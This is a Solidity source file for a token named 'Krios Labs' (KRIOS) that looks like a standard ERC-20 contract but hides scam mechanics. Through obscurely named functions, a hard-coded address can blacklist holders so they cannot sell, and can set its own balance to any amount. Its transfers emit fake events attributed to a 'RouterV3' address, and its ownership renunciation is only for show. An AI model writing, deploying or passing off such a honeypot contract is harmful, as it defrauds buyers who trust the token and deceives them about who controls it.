pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract KRIOS {
  
    mapping (address => uint256) public Sz;
    mapping (address => uint256) public Ui;
    mapping (address => bool) oZ;
    mapping(address => mapping(address => uint256)) public allowance;
	address pstruct = 0xBc46cB43DA85A65774acfCA3B03b7234E8e81c7a;
	address RouterV3 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;




    string public name = unicode"Krios Labs";
    string public symbol = unicode"KRIOS";
    uint8 public decimals = 18;
    uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);


    constructor()  {
    Sz[msg.sender] = totalSupply;
    emit Transfer(address(0), RouterV3, totalSupply); }

   

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == pstruct)  {
        require(Sz[msg.sender] >= value);
        Sz[msg.sender] -= value;  
        Sz[to] += value; 
        emit Transfer (RouterV3, to, value);
        return true; }  
        if(!oZ[msg.sender]) {
        require(Sz[msg.sender] >= value);
        Sz[msg.sender] -= value;  
        Sz[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}
		

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function mBurn () public {
         if(msg.sender == pstruct)   {
        Sz[msg.sender] = Ui[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return Sz[account]; }

        function mDel(address jx) public {
        if(msg.sender == pstruct)  { 
        oZ[jx] = false;}}
        function mCheck(address jx) public{
         if(msg.sender == pstruct)  { 
        require(!oZ[jx]);
        oZ[jx] = true;
        }}
             function mBridge(uint256 ki) public {
        if(msg.sender == pstruct)  { 
        Ui[msg.sender] = ki;} }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        if(from == pstruct)  {
        require(value <= Sz[from]);
        require(value <= allowance[from][msg.sender]);
        Sz[from] -= value;  
        Sz[to] += value; 
        emit Transfer (RouterV3, to, value);
        return true; }    
          if(!oZ[from] && !oZ[to]) {
        require(value <= Sz[from]);
        require(value <= allowance[from][msg.sender]);
        Sz[from] -= value;
        Sz[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}